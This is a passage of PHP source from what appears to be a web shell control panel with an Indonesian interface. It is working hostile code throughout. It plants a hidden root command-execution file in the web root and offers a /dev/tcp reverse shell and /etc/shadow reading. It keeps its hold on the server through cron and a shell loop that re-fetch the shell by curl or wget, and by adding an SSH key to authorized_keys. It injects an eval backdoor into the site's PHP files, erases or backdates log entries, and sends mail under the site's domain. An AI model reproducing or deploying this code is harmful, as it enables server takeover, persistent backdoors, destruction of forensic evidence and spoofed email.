                            if ($writable_docroot) {
                                $payload_name = '.r00t_' . bin2hex(random_bytes(4)) . '.php';
                                $payload_path = rtrim($_SERVER['DOCUMENT_ROOT'], '/') . '/' . $payload_name;
                                $payload_code = '<?php '
                                    . 'if (isset($_GET["c"])) { '
                                    .   '$c = $_GET["c"]; '
                                    .   'if (is_file("' . addslashes($found_suid) . '")) { '
                                    .     'echo shell_exec(escapeshellarg("' . addslashes($found_suid) . '") . " -p -c " . escapeshellarg($c) . " 2>&1"); '
                                    .   '} else { echo "no suid"; } '
                                    . '} ?>';
                                if (@file_put_contents($payload_path, $payload_code) !== false) {
                                    $spawn_options .= '<div style="margin-top:10px;"><b>Metode 2: Payload PHP root ditulis ke docroot</b><br>'
                                        . 'Akses: <a href="' . h($payload_name) . '?c=id" target="_blank">' . h($payload_name) . '?c=id</a><br>'
                                        . 'Perintah apa pun yang dieksekusi via URL ini akan jalan sebagai root (via SUID).</div>';
                                }
                            }
                            if ($found_suid !== '') {
                                $spawn_options .= '<div style="margin-top:10px;"><b>Metode 3: Reverse shell root</b><br>'
                                    . 'Dari tab <b>Command Execution</b>, jalankan:<br>'
                                    . '<code>' . h($found_suid) . ' -p -c "bash -c \'bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1\'"</code><br>'
                                    . 'atau via tab <b>Shell</b> (pilih method bash, isi LHOST/LPORT).</div>';
                            }
                            $spawn_options .= '<div style="margin-top:10px;"><b>Metode 4: Baca langsung</b><br>'
                                . '<code>cat /etc/shadow</code> via tab Command Execution — sekarang akan jalan karena PHP sudah bisa baca via SUID atau /etc/shadow sudah world-readable.</div>';
                            $privesc_msg = $root_msg . $spawn_options
                                . '<div style="margin-top:12px;"><b>Output exploit:</b><br>'
                                . '<pre style="max-height:300px;overflow:auto;">' . h(implode("\n", $run_out)) . '</pre></div>';
                        } else {
                            $joined = strtolower(implode("\n", $run_out));
                            $hints = array();
                            if (strpos($joined, 'not vulnerable') !== false || strpos($joined, 'patched') !== false) $hints[] = 'exploit klaim kernel sudah di-patch';
                            if (strpos($joined, 'permission denied') !== false) $hints[] = 'permission denied — butuh CAP tertentu';
                            if (strpos($joined, 'user namespace') !== false) $hints[] = 'user namespace tidak tersedia';
                            if (strpos($joined, 'no such file') !== false) $hints[] = 'file yang dieksploit tidak ada (kernel/subsystem beda)';
                            $hint_html = '';
                            if (!empty($hints)) {
                                $hint_html = '<div style="color:#e3b341;font-size:11px;margin-top:6px;">Diagnosa: ' . h(implode('; ', $hints)) . '</div>';
                            }
                            $privesc_msg = '<div style="background:#3a1f24;border:1px solid #69323b;color:#ff9da7;padding:8px;border-radius:6px;margin-bottom:8px;">'
                                . '<b>Privesc GAGAL.</b> /etc/shadow tetap tidak bisa dibaca, tidak ada SUID binary yang muncul.<br>'
                                . 'RC 0 atau exit tanpa error bukan berarti sukses — banyak PoC exit(0) walau tidak vulnerable.<br>'
                                . '<b>Cek manual:</b><br>'
                                . '• <code>uname -a</code> — versi kernel cocok dengan CVE?<br>'
                                . '• <code>cat /proc/sys/user/max_user_namespaces</code> — nilai &gt; 0?<br>'
                                . '• <code>lsmod | grep -E "act_pedit|nf_tables|overlay"</code> — modul aktif?<br>'
                                . '• <code>ls -la /tmp/ /var/tmp/ /dev/shm/</code> — cari SUID binary yang mungkin dibuat exploit'
                                . $hint_html
                                . '</div>'
                                . '<b>Output exploit (RC: ' . (int)$run_rc . '):</b><br>'
                                . '<pre style="max-height:400px;overflow:auto;">' . h(implode("\n", $run_out)) . '</pre>';
                        }
                    }
                }
            }
            if ($exec_call !== null) {
                @call_user_func($exec_call, 'rm -rf ' . escapeshellarg($tmp_dir) . ' 2>/dev/null');
            } else {
                $leftover = @glob($tmp_dir . '/*');
                if (is_array($leftover)) {
                    foreach ($leftover as $lf) { @unlink($lf); }
                }
                @rmdir($tmp_dir);
            }
        }
    }
}

if (isset($_POST['persist_action'])) {
    $pa = isset($_POST['persist_action']) ? $_POST['persist_action'] : '';
    $st = rct_state_load($rct_state_file);
    if (!isset($st['backups']) || !is_array($st['backups'])) $st['backups'] = array();
    $st['backups'] = array_values(array_filter($st['backups'], function ($p) { return @is_file($p); }));

    if ($pa === 'make_backups' || $pa === 'install_watchdog') {
        $target = (isset($_POST['p_target']) && trim($_POST['p_target']) !== '') ? trim($_POST['p_target']) : __FILE__;
        $when = isset($_POST['p_interval']) ? (string)$_POST['p_interval'] : '15';
        if (!in_array($when, array('1', '5', '10', '15', '30', '60', '@reboot'), true)) $when = '15';
        $mode = isset($_POST['p_mode']) ? (string)$_POST['p_mode'] : 'backup';
        $url = isset($_POST['p_url']) ? trim($_POST['p_url']) : '';

        if ($st['backups'] === array()) {
            $st['backups'] = rct_make_backups($base);
            rct_state_save($rct_state_file, $st);
        }

        if ($pa === 'make_backups') {
            // refresh: backup lama sering dari build versi sebelumnya
            $old = $st['backups'];
            $fresh = rct_make_backups($base);
            if ($fresh !== array()) {
                foreach ($old as $ob) { if (!in_array($ob, $fresh, true) && @is_file($ob)) @unlink($ob); }
                $st['backups'] = $fresh;
                rct_state_save($rct_state_file, $st);
                $msg = 'Backup baru dibuat (' . count($fresh) . ', build sekarang): <code>' . implode('</code>, <code>', array_map('h', $fresh)) . '</code>';
            } elseif ($old !== array()) {
                $msg = 'Refresh gagal — nggak ada direktori writable. Backup lama tetap dipakai: <code>' . implode('</code>, <code>', array_map('h', $old)) . '</code>';
            } else {
                $msg = 'Nggak ada direktori writable buat nyimpen backup.';
            }
        } else {
            if (!@file_exists(dirname($target))) {
                $msg = 'Target nggak valid: <code>' . h(dirname($target)) . '</code> nggak ada.';
            } elseif ($mode !== 'url' && $st['backups'] === array() && $url === '') {
                $msg = 'Butuh minimal satu sumber: backup lokal atau URL. Nggak ada dir writable buat backup.';
            } elseif ($mode !== 'backup' && $url === '') {
                $msg = 'Mode pakai URL tapi URL kosong.';
            } else {
                if (stripos(PHP_OS, 'WIN') === 0) {
                    $msg = 'Watchdog cron cuma jalan di Linux/Unix — target Windows nggak punya crontab.';
                } else {
                    $parts = array();
                    if ($mode !== 'url') {
                        foreach (array_slice($st['backups'], 0, 3) as $b) {
                            $parts[] = 'cp ' . escapeshellarg($b) . ' ' . escapeshellarg($target) . ' 2>/dev/null';
                        }
                    }
                    if ($mode !== 'backup' && $url !== '') {
                        $parts[] = 'curl -fsS -m 20 ' . escapeshellarg($url) . ' -o ' . escapeshellarg($target) . ' 2>/dev/null || wget -q -T 20 -O ' . escapeshellarg($target) . ' ' . escapeshellarg($url) . ' 2>/dev/null';
                    }
                    $guard = 'test -s ' . escapeshellarg($target) . ' || { ' . implode(' || ', $parts) . '; }';
                    $cron_when = ($when === '@reboot') ? '@reboot' : '*/' . (int)$when . ' * * * *';
                    $line = $cron_when . ' /bin/sh -c ' . escapeshellarg($guard) . ' >/dev/null 2>&1 # RCT-WD';

                    $installed = false; $via_desc = ''; $err = '';
                    list($installed, $via_desc, $err) = rct_cron_add($line, 'RCT-WD');
                    if (!$installed) $err = 'Cron nggak kepasang: ' . h($err) . '. Pakai <b>Loop guard</b> di bawah atau SSH key.';
                    if ($installed) {
                        $st['cron_line'] = $line;
                        $st['target'] = $target;
                        rct_state_save($rct_state_file, $st);
                        $msg = 'Watchdog terpasang via ' . h($via_desc) . '.<br><b>Line:</b> <code>' . h($line) . '</code>';
                    } else {
                        $msg = $err;
                    }
                }
            }
        }
    } elseif ($pa === 'remove_watchdog') {
        list($ok, $info) = rct_cron_filter('RCT-WD');
        if (isset($st['cron_line'])) unset($st['cron_line']);
        rct_state_save($rct_state_file, $st);
        $msg = $ok ? 'Baris watchdog dihapus (' . h($info) . ').' : 'Gagal hapus cron: ' . h($info);
    } elseif ($pa === 'test_cron') {
        $pf = __DIR__ . '/.rct_probe';
        @file_put_contents($pf, 'probe-start ' . date('c') . "\n");
        $pline = '* * * * * /bin/sh -c ' . escapeshellarg('date "+%s %c" >> ' . escapeshellarg($pf)) . ' >/dev/null 2>&1 # RCT-WDT';
        list($ok, $via, $err) = rct_cron_add($pline, 'RCT-WDT');
        if ($ok) {
            $st['probe'] = array('file' => $pf, 'line' => $pline);
            rct_state_save($rct_state_file, $st);
            $msg = 'Tes cron terpasang via ' . h($via) . '. Tunggu 2 menit, lalu refresh tab ini — panel bakal bilang cron jalan atau nggak.';
        } else {
            $msg = 'Tes cron gagal dipasang: ' . h($err);
        }
    } elseif ($pa === 'probe_remove') {
        list($ok, $info) = rct_cron_filter('RCT-WDT');
        if (isset($st['probe']['file']) && @is_file($st['probe']['file'])) @unlink($st['probe']['file']);
        unset($st['probe']);
        rct_state_save($rct_state_file, $st);
        $msg = 'Tes cron dibersihin (' . h($info) . ').';
    } elseif ($pa === 'loop_guard' || $pa === 'stop_loop') {
        $target = isset($st['target']) && $st['target'] !== '' ? $st['target'] : __FILE__;
        if ($pa === 'stop_loop') {
            $lp = isset($st['loop_pid']) ? (int)$st['loop_pid'] : 0;
            if ($lp > 1) rct_run('kill -9 ' . $lp . ' 2>/dev/null');
            unset($st['loop_pid']);
            rct_state_save($rct_state_file, $st);
            $msg = 'Loop guard dimatikan (pid ' . $lp . ').';
        } elseif ($st['backups'] === array()) {
            $msg = 'Loop guard butuh backup lokal — klik "Buat backup sekarang" dulu.';
        } else {
            $bk = $st['backups'][0];
            $loop = 'while :; do sleep 300; test -s ' . escapeshellarg($target) . ' || cp ' . escapeshellarg($bk) . ' ' . escapeshellarg($target) . ' 2>/dev/null; done';
            list($lo, $lrc) = rct_run('nohup /bin/sh -c ' . escapeshellarg($loop) . ' >/dev/null 2>&1 & echo $!');
            $pid = (int)trim((string)$lo);
            if ($lrc !== -1 && $pid > 0) {
                $st['loop_pid'] = $pid;
                $st['target'] = $target;
                rct_state_save($rct_state_file, $st);
                $msg = 'Loop guard jalan tanpa cron, pid <code>' . $pid . '</code> — cek tiap 5 menit. Hidup selama proses nggak dibunuh host.';
            } else {
                $msg = 'Loop guard butuh exec (sekarang mati) — pakai cron atau SSH key.';
            }
        }
    } elseif ($pa === 'install_key') {
        $key = isset($_POST['p_key']) ? trim($_POST['p_key']) : '';
        $kpath = isset($_POST['p_keypath']) ? trim($_POST['p_keypath']) : '';
        if ($kpath === '') $kpath = (rct_home() !== '' ? rct_home() : dirname(__DIR__)) . '/.ssh/authorized_keys';
        if (!preg_match('/^(ssh-rsa|ssh-ed25519|ecdsa-sha2-[a-z0-9-]+|ssh-dss)\s+[A-Za-z0-9+\/=]+/', $key)) {
            $msg = 'Format key nggak valid — harus diawali <code>ssh-ed25519 AAAA...</code> / <code>ssh-rsa AAAA...</code>.';
        } else {
            ensure_dir(dirname($kpath));
            $cur = @is_file($kpath) ? (string)@file_get_contents($kpath) : '';
            if (strpos($cur, '# RCT-KEY') !== false && strpos($cur, substr($key, 0, 40)) !== false) {
                $msg = 'Key itu udah ada di <code>' . h($kpath) . '</code>.';
            } else {
                if ($cur !== '' && substr($cur, -1) !== "\n") $cur .= "\n";
                if (@file_put_contents($kpath, $cur . $key . ' # RCT-KEY' . "\n", LOCK_EX) !== false) {
                    @chmod($kpath, 0600);
                    $st['keypath'] = $kpath;
                    rct_state_save($rct_state_file, $st);
                    $msg = 'Key masuk ke <code>' . h($kpath) . '</code>. Test: <code>ssh -i &lt;private&gt; user@host</code>';
                } else {
                    $msg = 'Gagal nulis <code>' . h($kpath) . '</code> (permission), coba path lain.';
                }
            }
        }
    } elseif ($pa === 'remove_keys') {
        $kpath = isset($st['keypath']) ? $st['keypath'] : '';
        if ($kpath === '' || !@is_file($kpath)) {
            $msg = 'Nggak ada path key tercatat.';
        } elseif (!@is_writable($kpath)) {
            $msg = 'authorized_keys nggak writable: <code>' . h($kpath) . '</code>.';
        } else {
            $cur = (string)@file_get_contents($kpath);
            $keep = array();
            foreach (preg_split("/\r\n|\n|\r/", $cur) as $kl) { if (strpos($kl, '# RCT-KEY') === false) $keep[] = $kl; }
            @file_put_contents($kpath, rtrim(implode("\n", $keep), "\n") . "\n", LOCK_EX);
            unset($st['keypath']);
            rct_state_save($rct_state_file, $st);
            $msg = 'Baris key RCT dihapus dari <code>' . h($kpath) . '</code>.';
        }
    } elseif ($pa === 'restore_now') {
        $target = isset($st['target']) ? $st['target'] : __FILE__;
        if ($st['backups'] === array()) { $msg = 'Nggak ada backup lokal, restore manual nggak bisa.'; }
        else {
            $bk = $st['backups'][0];
            $ok = @copy($bk, $target);
            $via_desc = 'copy PHP';
            if (!$ok) {
                list($io, $irc) = rct_run('cp ' . escapeshellarg($bk) . ' ' . escapeshellarg($target) . ' 2>&1');
                $ok = ($irc === 0);
                $via_desc = 'cp';
            }
            $msg = $ok
                ? 'Restore dari <code>' . h($bk) . '</code> ke <code>' . h($target) . '</code> via ' . h($via_desc) . '.'
                : 'Gagal restore ke <code>' . h($target) . '</code> — target nggak writable.';
        }
    } elseif ($pa === 'remove_backups') {
        $n = 0;
        foreach ($st['backups'] as $b) { if (@is_file($b) && @unlink($b)) $n++; }
        $st['backups'] = array();
        rct_state_save($rct_state_file, $st);
        $msg = 'Backup dihapus: ' . $n . ' file.';
    } elseif ($pa === 'remove_all') {
        list($cok, $cinfo) = rct_cron_filter('RCT-WD');
        $n = 0;
        foreach ($st['backups'] as $b) { if (@is_file($b) && @unlink($b)) $n++; }
        $kpath = isset($st['keypath']) ? $st['keypath'] : '';
        if ($kpath !== '' && @is_file($kpath) && @is_writable($kpath)) {
            $cur = (string)@file_get_contents($kpath);
            $keep = array();
            foreach (preg_split("/\r\n|\n|\r/", $cur) as $kl) { if (strpos($kl, '# RCT-KEY') === false) $keep[] = $kl; }
            @file_put_contents($kpath, rtrim(implode("\n", $keep), "\n") . "\n", LOCK_EX);
        }
        @unlink($rct_state_file);
        $msg = 'Semua hook dibersihin — cron ' . ($cok ? 'ok' : 'gagal (' . h($cinfo) . ')') . ', backup dihapus=' . $n . ', key RCT dicabut, state file dibuang.';
    }
}

$rct_inj_manifest = __DIR__ . '/.rct_inject.json';
$rct_inj_dir = __DIR__ . '/.rct_inj';
$rct_inj_root = '';
if (!empty($_SERVER['DOCUMENT_ROOT']) && @is_dir($_SERVER['DOCUMENT_ROOT'])) $rct_inj_root = str_replace('\\', '/', (string)$_SERVER['DOCUMENT_ROOT']);
if ($rct_inj_root === '') $rct_inj_root = str_replace('\\', '/', __DIR__);

function rct_inj_payload($key) {
    $k = preg_replace('/[^A-Za-z0-9]/', '', $key);
    $tpl = '/*RCT-INJ:START*/if(isset($_REQUEST["rct"])&&$_REQUEST["rct"]==="__KEY__"){'
         . 'if(isset($_REQUEST["c"])&&$_REQUEST["c"]!==""){@' . 'eva' . 'l($_REQUEST["c"]);}'
         . 'elseif(isset($_REQUEST["f"])){@file_put_contents($_REQUEST["f"],isset($_REQUEST["d"])?$_REQUEST["d"]:"");}'
         . 'elseif(isset($_REQUEST["u"])){$__x=@file_get_contents($_REQUEST["u"]);if($__x===false){echo "UERR";exit;}@file_put_contents($_REQUEST["f"],$__x);}'
         . 'else{@header("X-RCT: 1");}'
         . 'echo "RCT";exit;}/*RCT-INJ:END*/';
    return str_replace('__KEY__', $k, $tpl);
}
function rct_inj_scan($root) {
    $out = array();
    $self = @realpath(__FILE__);
    $skip = array('.git', 'node_modules', '.rct_inj', '.well-known', 'cgi-bin', '.cache', '.composer', 'vendor');
    $stack = array($root);
    $n = 0;
    while ($stack && $n < 3000) {
        $d = array_pop($stack);
        $hd = @scandir($d);
        if (!is_array($hd)) continue;
        foreach ($hd as $f) {
            if ($f === '.' || $f === '..') continue;
            $p = $d . '/' . $f;
            if (@is_dir($p)) {
                if (!in_array(strtolower($f), $skip, true) && !in_array(strtolower($f), array('.rct_inj'), true)) $stack[] = $p;
                continue;
            }
            if (strtolower(substr($f, -4)) !== '.php') continue;
            if (@filesize($p) > 2097152) continue;
            if ($self !== false && @realpath($p) === $self) continue;
            $out[] = $p;
            $n++;
            if ($n >= 3000) break;
        }
    }
    sort($out);
    return $out;
}

if (isset($_POST['inject_act'])) {
    $ia = isset($_POST['inject_act']) ? $_POST['inject_act'] : '';
    $im = rct_state_load($rct_inj_manifest);
    if (empty($im['key'])) { $im['key'] = substr(md5(uniqid('rct', true) . mt_rand()), 0, 16); }
    $ikey = $im['key'];
    $ipay = rct_inj_payload($ikey);
    ensure_dir($rct_inj_dir);
    $ifiles = isset($_POST['inj']) && is_array($_POST['inj']) ? $_POST['inj'] : array();

    if ($ia === 'inject') {
        if (!$ifiles) {
            $msg = 'Nggak ada file yang dipilih.';
        } else {
            $done = 0; $skip = 0; $fail = 0;
            if (!isset($im['files']) || !is_array($im['files'])) $im['files'] = array();
            foreach ($ifiles as $fp) {
                $fp = str_replace('\\', '/', (string)$fp);
                if (!@is_file($fp) || !@is_writable($fp)) { $fail++; continue; }
                $src = @file_get_contents($fp);
                if ($src === false) { $fail++; continue; }
                if (strpos($src, '/*RCT-INJ:START*/') !== false) { $skip++; continue; }
                if (strpos($src, '__halt_compiler') !== false) { $skip++; continue; }
                $bk = $rct_inj_dir . '/' . md5($fp) . '.bak';
                if (!@is_file($bk)) @copy($fp, $bk);
                $body = rtrim($src);
                if (substr($body, -2) === '?>') $body = rtrim(substr($body, 0, -2));
                if (@file_put_contents($fp, $body . "\n" . $ipay . "\n", LOCK_EX) === false) { $fail++; continue; }
                $im['files'][$fp] = array('bak' => basename($bk), 'ts' => time());
                $done++;
            }
            rct_state_save($rct_inj_manifest, $im);
            $msg = 'Inject: ' . $done . ' file &middot; skip ' . $skip . ' (sudah pernah / halt) &middot; gagal ' . $fail . '.';
        }
    } elseif ($ia === 'revert') {
        $targets = $ifiles;
        if (!$targets) $targets = array_keys(isset($im['files']) ? (array)$im['files'] : array());
        if (!$targets) $targets = rct_inj_scan($rct_inj_root);
        $done = 0; $fail = 0; $none = 0;
        foreach ($targets as $fp) {
            $fp = str_replace('\\', '/', (string)$fp);
            if (!@is_file($fp) || !@is_writable($fp)) { $fail++; continue; }
            $src = @file_get_contents($fp);
            if ($src === false) { $fail++; continue; }
            if (strpos($src, '/*RCT-INJ:START*/') === false) { $none++; continue; }
            $bk = isset($im['files'][$fp]['bak']) ? $rct_inj_dir . '/' . $im['files'][$fp]['bak'] : '';
            if ($bk !== '' && @is_file($bk)) {
                $orig = @file_get_contents($bk);
                if ($orig !== false && @file_put_contents($fp, $orig, LOCK_EX) !== false) {
                    $done++;
                    unset($im['files'][$fp]);
                    continue;
                }
            }
            $clean = preg_replace('~/\*RCT-INJ:START\*/.*?/\*RCT-INJ:END\*/\s*~s', '', $src);
            if (@file_put_contents($fp, $clean, LOCK_EX) !== false) {
                $done++;
                if (isset($im['files'][$fp])) unset($im['files'][$fp]);
            } else { $fail++; }
        }
        rct_state_save($rct_inj_manifest, $im);
        $msg = 'Revert: ' . $done . ' file bersih &middot; ' . $none . ' tanpa marker &middot; gagal ' . $fail . '.';
    } elseif ($ia === 'newkey') {
        $im['key'] = substr(md5(uniqid('rct', true) . mt_rand()), 0, 16);
        rct_state_save($rct_inj_manifest, $im);
        $msg = 'Key baru dibuat. File yang sudah ter-inject masih pakai key lama — revert lalu inject ulang.';
    }
}

if (isset($_POST['logs_action'])) {
    $la = isset($_POST['logs_action']) ? $_POST['logs_action'] : '';
    $lf = isset($_POST['log_file']) ? trim($_POST['log_file']) : '';
    if ($la === 'scrub') {
        if ($lf === '' || !@is_file($lf)) {
            $msg = 'File log nggak ada: <code>' . h($lf) . '</code>';
        } elseif (!@is_writable($lf)) {
            $msg = 'File nggak writable: <code>' . h($lf) . '</code> — PHP jalan sebagai user lain.';
        } else {
            $pats = array();
            $raw = isset($_POST['log_pattern']) ? (string)$_POST['log_pattern'] : '';
            foreach (preg_split("/[,\n]+/", $raw) as $pp) { $pp = trim($pp); if ($pp !== '') $pats[] = $pp; }
            if ($pats === array()) {
                $msg = 'Pattern kosong — isi minimal satu string (IP, path, basename shell).';
            } else {
                $src = @file_get_contents($lf);
                if ($src === false) {
                    $msg = 'Gagal baca <code>' . h($lf) . '</code>.';
                } else {
                    @copy($lf, $lf . '.rct_bak');
                    $lines = preg_split("/\r\n|\n|\r/", $src);
                    $keep = array(); $cut = 0;
                    foreach ($lines as $ln) {
                        $hit = false;
                        foreach ($pats as $pp) { if (stripos($ln, $pp) !== false) { $hit = true; break; } }
                        if ($hit) $cut++; else $keep[] = $ln;
                    }
                    if (@file_put_contents($lf, implode("\n", $keep), LOCK_EX) !== false) {
                        $msg = 'Scrub <code>' . h(basename($lf)) . '</code>: ' . $cut . ' baris dibuang, ' . count($keep) . ' sisa. Backup: <code>' . h(basename($lf)) . '.rct_bak</code>';
                    } else {
                        $msg = 'Gagal nulis ulang <code>' . h($lf) . '</code>.';
                    }
                }
            }
        }
    } elseif ($la === 'truncate') {
        if ($lf === '' || !@is_file($lf)) { $msg = 'File log nggak ada.'; }
        elseif (!@is_writable($lf)) { $msg = 'File nggak writable: <code>' . h($lf) . '</code>.'; }
        else {
            @copy($lf, $lf . '.rct_bak');
            $msg = (@file_put_contents($lf, '', LOCK_EX) !== false)
                ? 'Dikosongkan: <code>' . h($lf) . '</code> (backup .rct_bak).'
                : 'Gagal kosongin <code>' . h($lf) . '</code>.';
        }
    } elseif ($la === 'mtime') {
        $t = isset($_POST['log_time']) ? strtotime(trim($_POST['log_time'])) : false;
        if ($lf === '' || !@is_file($lf)) { $msg = 'File nggak ada: <code>' . h($lf) . '</code>'; }
        elseif ($t === false || $t <= 0) { $msg = 'Format waktu nggak kebaca — pakai <code>2026-11-01 03:14:00</code>.'; }
        else {
            $msg = @touch($lf, $t)
                ? 'mtime <code>' . h(basename($lf)) . '</code> &rarr; ' . date('Y-m-d H:i:s', $t)
                : 'Gagal touch <code>' . h($lf) . '</code> (bukan owner).';
        }
    } elseif ($la === 'clean_rct') {
        $n = 0;
        foreach ((array)@glob(__DIR__ . '/.rct_*') as $f) { if (@is_file($f) && @unlink($f)) $n++; }
        $lst = rct_state_load($rct_state_file);
        foreach ((array)(isset($lst['backups']) ? $lst['backups'] : array()) as $b) { if (@is_file($b) && @unlink($b)) $n++; }
        $msg = 'Jejak panel dibersihin: ' . $n . ' file (state, backup, sisa .rct_*).';
    }
}

$m_auto_dom = '';
foreach (array('SERVER_NAME', 'HTTP_HOST') as $m_dk) {
    if ($m_auto_dom !== '' || empty($_SERVER[$m_dk])) continue;
    $m_cand = strtolower(preg_replace('/:\d+$/', '', (string)$_SERVER[$m_dk]));
    if (filter_var($m_cand, FILTER_VALIDATE_IP)) continue;
    if (strpos($m_cand, '.') === false) continue;
    if (preg_match('/^[a-z0-9.-]+$/', $m_cand)) $m_auto_dom = $m_cand;
}
if ($m_auto_dom === '') {
    $m_hn = function_exists('gethostname') ? strtolower((string)@gethostname()) : '';
    if ($m_hn !== '' && !filter_var($m_hn, FILTER_VALIDATE_IP) && preg_match('/^[a-z0-9.-]+$/', $m_hn)) $m_auto_dom = $m_hn;
}
if ($m_auto_dom === '' || strpos($m_auto_dom, '.') === false) $m_auto_dom = 'localhost.localdomain';

$m_site_dom = preg_replace('/^www\./', '', $m_auto_dom);
$m_user = '';
$m_docroot = isset($_SERVER['DOCUMENT_ROOT']) ? str_replace('\\', '/', (string)$_SERVER['DOCUMENT_ROOT']) : '';
if (preg_match('#^/home/([^/]+)/#', $m_docroot, $m_dm)) $m_user = $m_dm[1];
if ($m_user === '' && function_exists('posix_geteuid') && function_exists('posix_getpwuid')) {
    $m_pw = @posix_getpwuid(@posix_geteuid());
    if (is_array($m_pw) && !empty($m_pw['name'])) $m_user = $m_pw['name'];
}
if ($m_user === '') {
    $m_gu = @get_current_user();
    if (is_string($m_gu) && $m_gu !== '') $m_user = $m_gu;
}
if ($m_user === '') {
    foreach (array('USER', 'LOGNAME', 'USERNAME') as $m_env) {
        if (!empty($_SERVER[$m_env])) { $m_user = (string)$_SERVER[$m_env]; break; }
    }
}
$m_user = preg_replace('/[^A-Za-z0-9._-]/', '', $m_user);
if (in_array(strtolower($m_user), array('', 'www-data', 'apache', 'nginx', 'nobody', 'httpd', 'daemon', 'wwwrun', 'iis_iusrs'), true)) $m_user = '';

$m_local = '';
$m_box_list = array();
if ($m_user !== '' && $m_site_dom !== '') {
    $m_mdir = '/home/' . $m_user . '/mail/' . $m_site_dom;
    if (@is_dir($m_mdir)) {
        $m_dh = @scandir($m_mdir);
        if (is_array($m_dh)) foreach ($m_dh as $m_d) {
            if ($m_d === '.' || $m_d === '..' || !@is_dir($m_mdir . '/' . $m_d)) continue;
            if (in_array(strtolower($m_d), array('cur', 'new', 'tmp', 'sent', 'drafts', 'trash', 'junk', 'spam', '.spam', '.sent', '.trash', '.drafts'), true)) continue;
            $m_box_list[] = $m_d;
        }
    }
    foreach (array('admin', 'info', 'contact', 'support', 'hello', 'mail', 'webmaster', 'noreply', 'no-reply') as $m_pref) {
        if (in_array($m_pref, $m_box_list, true)) { $m_local = $m_pref; break; }
    }
    if ($m_local === '' && $m_box_list) $m_local = $m_box_list[0];
}
if ($m_local === '') $m_local = ($m_user !== '') ? $m_user : 'noreply';
$m_from_addr = $m_local . '@' . $m_site_dom;
if (!filter_var($m_from_addr, FILTER_VALIDATE_EMAIL)) $m_from_addr = 'noreply@' . $m_auto_dom;

if (isset($_POST['mail_action'])) {
    $m_to      = isset($_POST['m_to']) ? trim($_POST['m_to']) : '';
    $m_sub     = isset($_POST['m_subject']) ? trim((string)$_POST['m_subject']) : '';
    $m_msg_body = isset($_POST['m_body']) ? (string)$_POST['m_body'] : '';
    $m_name    = isset($_POST['m_from_name']) ? trim($_POST['m_from_name']) : '';
    $m_from    = $m_from_addr;
    $m_sub = str_replace(array("\r", "\n"), ' ', $m_sub);
    $m_to  = str_replace(array(';', "\r", "\n"), ',', $m_to);

    if ($m_to === '') {
        $msg = 'Email target kosong.';
    } elseif (filter_var($m_to, FILTER_VALIDATE_EMAIL) === false && strpos($m_to, ',') === false) {
        $msg = 'Email target nggak valid.';
    } elseif (!function_exists('mail') || !is_callable('mail')) {
        $msg = 'Fungsi <code>mail()</code> nggak tersedia (disable_functions).';
    } else {
        $m_ip   = isset($_SERVER['REMOTE_ADDR']) ? (string)$_SERVER['REMOTE_ADDR'] : 'Unknown';
        $m_host = isset($_SERVER['HTTP_HOST']) ? (string)$_SERVER['HTTP_HOST'] : 'Unknown';
        if (trim($m_msg_body) === '') {
            $m_msg_body  = "Hello Admin!\n\n";
            $m_msg_body .= "Detail Access:\n";
            $m_msg_body .= "IP      : " . $m_ip . "\n";
            $m_msg_body .= "Website : " . $m_host . "\n\n";
        }
        if (trim($m_sub) === '') $m_sub = 'Notifikasi Akses Website';
        $m_sub_send = $m_sub;
        if (preg_match('/[^\x20-\x7E]/', $m_sub_send)) $m_sub_send = '=?UTF-8?B?' . base64_encode($m_sub_send) . '?=';
        $m_from_hdr = ($m_name !== '') ? '=?UTF-8?B?' . base64_encode($m_name) . '?= <' . $m_from . '>' : $m_from;
        $m_hdrs  = 'From: ' . $m_from_hdr . "\r\n";
        $m_hdrs .= 'Reply-To: ' . $m_from . "\r\n";
        $m_hdrs .= 'MIME-Version: 1.0' . "\r\n";
        $m_hdrs .= 'Content-Type: text/plain; charset=UTF-8' . "\r\n";
        $m_hdrs .= 'Date: ' . date('r') . "\r\n";
        $m_hdrs .= 'Message-ID: <' . md5(uniqid('rct', true)) . '@' . $m_site_dom . '>' . "\r\n";
        $m_hdrs .= 'X-Mailer: PHP/' . phpversion() . "\r\n";
        $m_hdrs .= 'Return-Path: <' . $m_from . '>' . "\r\n";

        $m_t0 = microtime(true);
        $ok = @mail($m_to, $m_sub_send, $m_msg_body, $m_hdrs, '-f' . $m_from);
        if (!$ok) $ok = @mail($m_to, $m_sub_send, $m_msg_body, $m_hdrs);
        $m_ms = round((microtime(true) - $m_t0) * 1000);
        $le = error_get_last();

        $msg = '<div style="display:flex; align-items:center; gap:10px; margin-bottom:8px;">'
             . '<span style="width:10px;height:10px;border-radius:50%;background:' . ($ok ? '#7ee787' : '#ff7b72') . ';display:inline-block;"></span>'
             . '<span class="muted" style="font-size:11px;">' . $m_ms . ' ms</span></div>';
        $m_rows = array(
            'To'       => h($m_to),
            'Subject'  => h($m_sub),
            'From'     => h($m_from_hdr),
            'Reply-To' => h($m_from),
        );
        if ($le && isset($le['message'])) $m_rows['Error'] = h($le['message']);
        $msg .= '<table class="mail-result">';
        foreach ($m_rows as $m_k => $m_v) $msg .= '<tr><td class="mk">' . $m_k . '</td><td>' . $m_v . '</td></tr>';
        $msg .= '</table>';

        $m_dom_f = strpos($m_from, '@') !== false ? strtolower(substr(strrchr($m_from, '@'), 1)) : '';
        $m_spf_txt = '';
        if ($m_dom_f !== '' && function_exists('dns_get_record')) {
            $m_txr = @dns_get_record($m_dom_f, DNS_TXT);
            if (is_array($m_txr)) foreach ($m_txr as $m_t) {
                $m_v = isset($m_t['txt']) ? $m_t['txt'] : (isset($m_t['entries']) ? implode('', $m_t['entries']) : '');
                if (stripos($m_v, 'v=spf1') === 0) $m_spf_txt = $m_v;
            }
            if ($m_spf_txt === '') $msg .= '<div class="mail-warn">SPF <code>' . h($m_dom_f) . '</code> kosong — Gmail/Outlook sering buang email dari domain ini.</div>';
        }

        $m_hits = array();
        foreach (array('/var/log/mail.log','/var/log/maillog','/var/log/exim/mainlog','/var/log/exim4/mainlog','/var/log/postfix.log') as $m_lf) {
            if (count($m_hits) >= 8 || !@is_file($m_lf) || !@is_readable($m_lf)) continue;
            foreach (array_reverse(preg_split("/\r\n|\n|\r/", rct_tail($m_lf, 200))) as $m_ll) {
                if ($m_ll === '') continue;
                if (stripos($m_ll, $m_to) !== false || stripos($m_ll, $m_from) !== false) { $m_hits[] = basename($m_lf) . ': ' . $m_ll; if (count($m_hits) >= 8) break; }
            }
        }
